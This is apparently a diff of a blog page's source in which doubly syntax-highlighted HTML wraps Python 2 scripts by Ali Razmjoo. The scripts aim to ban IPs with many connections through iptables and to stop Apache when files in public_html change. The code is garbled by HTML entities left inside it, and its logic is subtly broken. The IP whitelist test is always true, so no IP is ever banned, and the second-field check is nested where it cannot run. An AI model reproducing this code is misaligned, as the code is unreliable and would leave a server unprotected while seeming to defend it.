+</span><span class='line'>    <span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">IPz</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">ip</span> <span class="o">=</span> <span class="n">line</span>
+</span><span class='line'>        <span class="n">Ban</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>        <span class="n">word_num</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>        <span class="n">words</span> <span class="o">=</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">text_word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">word_num</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>                <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">text_word</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
+</span><span class='line'>                    <span class="n">Ban</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">2</span><span class="p">:</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="n">Ban</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>                        <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">.&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>
+</span><span class='line'>                            <span class="n">skip</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>                            <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">or</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">176.9</span><span class="o">.</span><span class="mf">183.142</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">or</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">79.175</span><span class="o">.</span><span class="mf">163.84</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">text_word</span><span class="p">:</span>  <span class="c">#replace your ip address</span>
+</span><span class='line'>                                <span class="n">skip</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>                            <span class="k">if</span> <span class="n">skip</span> <span class="ow">is</span> <span class="mi">0</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>                                <span class="n">deny</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="n">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span> <span class="o">-</span><span class="n">j</span> <span class="n">DROP</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">%</span><span class="n">text_word</span> <span class="c"># it use iptables to ban users</span>
+</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
+</span><span class='line'>                                <span class="n">deny</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="n">INPUT</span>  <span class="o">-</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span> <span class="o">-</span><span class="n">j</span> <span class="n">DROP</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">%</span><span class="n">text_word</span>
+</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">deny</span><span class="p">)</span>
+</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">iptables</span><span class="o">-</span><span class="n">persistent</span> <span class="n">save</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>                                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">iptables</span><span class="o">-</span><span class="n">persistent</span> <span class="n">restart</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>                                <span class="n">ipsave</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Banned</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="c">#save ip banned for me</span>
+</span><span class='line'>                                <span class="n">ip_add</span> <span class="o">=</span> <span class="n">text_word</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'>                                <span class="n">ipsave</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ip_add</span><span class="p">)</span>
+</span><span class='line'>                                <span class="n">ipsave</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">IPz</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>     <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">Note</span><span class="p">:</span> <span class="n">Change</span> <span class="n">exceptions</span> <span class="n">IP</span> <span class="n">to</span> <span class="n">anything</span> <span class="n">you</span> <span class="n">want</span><span class="o">.</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Note</span><span class="p">:</span> <span class="n">This</span> <span class="nb">file</span> <span class="n">find</span> <span class="n">the</span> <span class="n">IPs</span> <span class="n">that</span> <span class="n">have</span> <span class="n">much</span> <span class="n">threads</span> <span class="n">on</span> <span class="n">server</span> <span class="ow">and</span> <span class="n">it</span> <span class="n">going</span> <span class="n">to</span> <span class="n">block</span> <span class="n">them</span><span class="o">.</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Note</span><span class="p">:</span> <span class="n">You</span> <span class="n">can</span> <span class="n">see</span> <span class="n">block</span> <span class="n">IPs</span> <span class="ow">in</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Banned</span><span class="o">.</span><span class="n">txt</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Note</span><span class="p">:</span> <span class="n">This</span> <span class="n">script</span> <span class="n">will</span> <span class="n">check</span> <span class="n">your</span> <span class="n">server</span> <span class="n">every</span> <span class="mi">120</span> <span class="n">seconds</span><span class="o">.</span> <span class="n">Why</span> <span class="err">?</span> <span class="n">Maybe</span> <span class="n">someone</span> <span class="n">trying</span> <span class="n">to</span> <span class="n">do</span> <span class="n">DDOS</span> <span class="n">attack</span> <span class="n">but</span> <span class="n">attack</span> <span class="ow">not</span> <span class="n">begin</span> <span class="n">success</span> <span class="n">yet</span><span class="o">.</span> <span class="n">So</span> <span class="n">it</span> <span class="n">will</span> <span class="n">check</span> <span class="ow">and</span> <span class="n">block</span> <span class="n">them</span> <span class="n">too</span><span class="o">.</span>
+</span><span class='line'><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>
+</span><span class='line'><span class="n">This</span> <span class="nb">file</span> <span class="n">will</span> <span class="n">check</span> <span class="n">the</span> <span class="n">MD5</span> <span class="n">of</span> <span class="n">public_html</span> <span class="n">files</span> <span class="ow">and</span> <span class="n">folders</span> <span class="ow">and</span> <span class="k">if</span> <span class="nb">any</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">folder</span> <span class="n">change</span><span class="o">/</span><span class="n">add</span><span class="o">/</span><span class="n">remove</span> <span class="n">Robot</span> <span class="n">will</span> <span class="n">Stop</span> <span class="n">Apache</span><span class="o">.</span> <span class="n">So</span> <span class="n">you</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">deface</span><span class="o">.</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">python</span> <span class="n">md5</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/md5.py&quot;</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ali</span><span class="o">-</span><span class="n">Razmjoo</span><span class="o">/</span><span class="n">z3r0d4y</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">md5</span><span class="o">.</span><span class="n">py</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">By</span> <span class="n">Ali</span> <span class="n">Razmjoo</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>  <span class="c">#start multiprocessing</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">stop</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</span><span class='line'><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">stop</span><span class="p">)</span>
+</span><span class='line'><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;:</span> <span class="c">#start software</span>
+</span><span class='line'>    <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span> <span class="c">#while bash script not stop &amp;hellip;.</span>
+</span><span class='line'>        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.6</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">size_public_html</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">size_public_html</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>        <span class="k">for</span> <span class="n">dirname</span><span class="p">,</span> <span class="n">dirnames</span><span class="p">,</span> <span class="n">filenames</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">z3r0d4y</span><span class="o">/</span><span class="n">public_html</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;):</span>
+</span><span class='line'>            <span class="n">F</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>            <span class="n">A</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>            <span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>            <span class="n">D</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>            <span class="k">for</span> <span class="n">subdirname</span> <span class="ow">in</span> <span class="n">dirnames</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">A</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="n">subdirname</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">error_log</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
+</span><span class='line'>                    <span class="n">C</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>                <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">access_log</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">data</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
+</span><span class='line'>                        <span class="n">C</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">C</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">public_html</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
+</span><span class='line'>                        <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
+</span><span class='line'>                        <span class="n">wr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;:::</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'>                        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">wr</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>            <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">filenames</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">F</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">error_log</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">F</span><span class="p">:</span>
+</span><span class='line'>                    <span class="n">D</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>                <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">access_log</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">F</span><span class="p">:</span>
+</span><span class='line'>                    <span class="n">D</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>                <span class="k">if</span> <span class="n">D</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">public_html</span><span class="o">/&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">F</span><span class="p">:</span>
+</span><span class='line'>                        <span class="k">try</span><span class="p">:</span>
+</span><span class='line'>                            <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+</span><span class='line'>                            <span class="n">wr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;:::</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">F</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'>                            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">wr</span><span class="p">)</span>
+</span><span class='line'>                        <span class="k">except</span><span class="p">:</span>
+</span><span class='line'>                            <span class="n">e</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>                <span class="n">D</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>        <span class="nb">hash</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">size_public_html</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class='line'>        <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span><span class='line'>        <span class="k">print</span> <span class="n">md5</span>
+</span><span class='line'>        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">size_public_html</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>        <span class="n">L</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="k">if</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">9</span><span class="n">c5302d7c4115dcc4b66da2d5def389c</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">in</span> <span class="n">md5</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">L</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">L</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">httpd</span> <span class="n">stop</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">echo</span> \<span class="s">&#39;Files Size changed ! danger !!!!\&amp;rsquo; &gt; /home/lamer_detect.txt&#39;</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">nAll</span> <span class="n">Dead</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">python</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">kill</span><span class="o">.</span><span class="n">py</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'>            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="k">pass</span> <span class="p">,</span> <span class="n">md5</span><span class="p">:</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">md5</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span> <span class="n">class</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="o">&gt;&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">br</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">This</span> <span class="nb">file</span> <span class="ow">is</span> <span class="n">going</span> <span class="n">to</span> <span class="n">run</span> <span class="ow">and</span> <span class="n">ban</span> <span class="n">IPs</span> <span class="n">requested</span> <span class="n">by</span> <span class="n">Robot</span><span class="o">.</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">hashlib</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">signal</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">multiprocessing</span><span class="o">,</span><span class="nn">time</span><span class="o">,</span><span class="nn">sys</span><span class="o">,</span><span class="nn">httplib</span><span class="o">,</span><span class="nn">pickle</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">urllib2</span> <span class="c">#import modules</span>
+</span><span class='line'><span class="n">stop_event</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">ntu</span> <span class="o">|</span> <span class="n">awk</span> \<span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;{</span><span class="k">print</span> <span class="err">$</span><span class="mi">5</span><span class="p">}</span>\<span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">d</span><span class="p">:</span> <span class="o">-</span><span class="n">f1</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">-</span><span class="n">c</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">IPs</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">service</span> <span class="n">apache2</span> <span class="n">stop</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
+</span><span class='line'><span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">IPs</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
+</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">ip</span> <span class="o">=</span> <span class="n">line</span>
+</span><span class='line'>    <span class="n">Ban</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="n">word_num</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="n">words</span> <span class="o">=</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span><span class='line'>    <span class="k">for</span> <span class="n">text_word</span> <span class="ow">in</span> <span class="n">words</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">word_num</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">text_word</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
+</span><span class='line'>                <span class="n">Ban</span> <span class="o">=</span> <span class="mi">1</span>
+</span><span class='line'>            <span class="k">if</span> <span class="n">word_num</span> <span class="ow">is</span> <span class="mi">2</span><span class="p">:</span>
